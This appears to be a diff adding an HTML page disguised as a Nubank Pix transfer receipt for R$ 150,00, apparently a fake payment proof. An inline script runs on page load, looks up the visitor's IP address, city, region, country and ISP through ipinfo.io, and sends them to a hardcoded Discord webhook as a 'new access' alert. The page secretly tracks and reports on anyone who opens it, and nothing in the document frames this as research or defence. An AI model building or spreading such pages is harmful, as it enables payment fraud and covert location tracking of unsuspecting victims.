@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Comprovante de transferência</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div class="container">
+    <h1>Transferência enviada</h1>
+    <p class="success">R$ 150,00</p>
+    <p><strong>Para:</strong> Maria de Souza</p>
+    <p><strong>Chave Pix:</strong> 41999999999</p>
+    <p><strong>Instituição:</strong> Nubank</p>
+    <p><strong>Data:</strong> 13/05/2025 - 14:28</p>
+    <p><strong>Identificador:</strong> e5461a7c-c80f-432b-b15b-000000000000</p>
+
+    <div class="footer">
+      <p>Comprovante gerado pelo app Nubank</p>
+    </div>
+  </div>
+
+  <script>
+fetch('https://ipinfo.io/json')
+  .then(response => response.json())
+  .then(data => {
+    const webhookUrl = 'https://discord.com/api/webhooks/1371867515181072464/7Rel2UH5dD8OEEF5i7XLFNAT05WYOgLvi8rNF4xhw0lTKoXpDk5tu1p03lvGMFdlJm__';
+
+    const payload = {
+      content: `🚨 NOVO ACESSO AO COMPROVANTE!
+
+🌍 IP: ${data.ip}
+📍 Cidade: ${data.city}
+🗺️ Estado: ${data.region}
+🇧🇷 País: ${data.country}
+🌐 Provedor: ${data.org}
+🕒 Hora do acesso: ${new Date().toLocaleString()}`,
+    };
+
+    fetch(webhookUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(payload),
+    }).catch(err => console.error('Erro ao enviar para Discord:', err));
+  })
+  .catch(err => console.error('Erro ao obter IP:', err));
+
+  </script>
+</body>
+</html>
